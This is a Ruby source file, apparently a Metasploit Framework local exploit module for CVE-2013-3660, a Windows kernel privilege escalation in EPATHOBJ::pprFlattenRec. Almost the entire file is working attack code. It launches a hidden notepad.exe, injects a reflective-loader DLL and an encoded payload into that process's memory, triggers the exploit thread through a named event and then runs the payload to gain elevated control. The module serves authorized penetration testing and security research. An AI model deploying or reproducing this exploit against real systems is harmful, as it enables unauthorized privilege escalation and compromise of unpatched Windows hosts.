##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/process'
require 'msf/core/post/windows/file_info'

class Metasploit3 < Msf::Exploit::Local
  Rank = AverageRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'Windows EPATHOBJ::pprFlattenRec Local Privilege Escalation',
      'Description'    => %q{
          This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due to the usage
        of uninitialized data which allows to corrupt memory. At the moment, the module has
        been tested successfully on Windows XP SP3, Windows 2003 SP1, and Windows 7 SP1.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Tavis Ormandy <taviso[at]cmpxchg8b.com>', # Vulnerability discovery and Original Exploit
          'progmboy <programmeboy[at]gmail.com>',    # Original Exploit
          'Keebie4e',    # Metasploit integration
          'egypt',       # Metasploit integration
          'sinn3r',      # Metasploit integration
          'juan vazquez',# Metasploit integration
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'    # Tweaks
        ],
      'Arch'           => ARCH_X86,
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Targets'        =>
        [
          [ 'Automatic', { } ]
        ],
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'     =>
        [
          [ 'CVE', '2013-3660' ],
          [ 'EDB', '25912' ],
          [ 'OSVDB', '93539' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2013/May/91' ],
        ],
      'DisclosureDate' => 'May 15 2013',
      'DefaultTarget'  => 0
    }))

  end

  def check
    os = sysinfo["OS"]
    if os =~ /windows/i
      return Exploit::CheckCode::Vulnerable
    end
  end

  def create_proc()
    windir = expand_path("%windir%")
    # Select path of executable to run depending the architecture
    if sysinfo['Architecture'] =~ /x86/
      cmd = "#{windir}\\System32\\notepad.exe"
    end
    # run hidden
    proc = session.sys.process.execute(cmd, nil, {'Hidden' => true })
    return proc
  end

  def exploit

    if sysinfo["Architecture"] =~ /wow64/i
      fail_with(Exploit::Failure::NoTarget, "Running against WOW64 is not supported")
    elsif sysinfo["Architecture"] =~ /x64/
      fail_with(Exploit::Failure::NoTarget, "Running against 64-bit systems is not supported")
    end
    dll = ''
    offset = nil
    file = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-3660", "exploit.dll")
                File.open( file ) { |f| dll += f.read(f.stat.size) }

                pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
    
                pe.exports.entries.each do |entry|
                	if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
                        	offset = pe.rva_to_file_offset( entry.rva )
                                break
                        end
                end
  
    print_error("No offset found") unless offset

    new_proc = create_proc
    new_pid = new_proc.pid

    if not new_pid
      fail_with(Exploit::Failure::Unknown, "Failed to create a new process")
    end

    pay = payload.encoded

    vprint_status("Injecting payload into memory")
    host_process = session.sys.process.open(new_pid.to_i, PROCESS_ALL_ACCESS)
    mem = host_process.memory.allocate(pay.length + (pay.length % 1024))
    host_process.memory.protect(mem)
    host_process.memory.write(mem, pay)

    vprint_status("Injecting exploit into memory")
    dll_mem = host_process.memory.allocate(dll.length + (dll.length % 1024))
    host_process.memory.protect(dll_mem)
    host_process.memory.write(dll_mem, dll)
    print_status("Starting exploit thread")
    exploit_thread = host_process.thread.create(dll_mem+offset)
    vprint_status("Opening signalling event")
    # 0x1F0003 EVENT_ALL_ACCESS
    ret = client.railgun.kernel32.OpenEventA(0x1F0003,true,"cve_2013_3660_event")
    event_handle = ret['return']
    
    if event_handle == 0
      fail_with(Exploit::Failure::Unknown, "Unable to signal the exploit GetLastError: #{ret['GetLastError']}")
    end

    vprint_status("Signalling exploit to start and waiting for the thread to complete")
    wait = client.railgun.kernel32.SignalObjectAndWait(event_handle, exploit_thread.handle, 20000, false)
  
    if wait['return'] != 0
      print_error("Error waiting for exploit to complete ret val: #{wait['return']}")
    else
      print_good("Exploit has finished...")
    end

    unless client.railgun.kernel32.CloseHandle(event_handle)['return']
      vprint_warning("Unable to close event handle cleanly")
    end

    begin
      print_status("Executing payload...")
      if host_process.thread.create(mem)
        print_good("Payload executed successfully... Enjoy!")
      end
    rescue ::Rex::Post::Meterpreter::RequestError
      fail_with(Exploit::Failure::Unknown, "Unsuccessful, try again!")
    end
  end
end
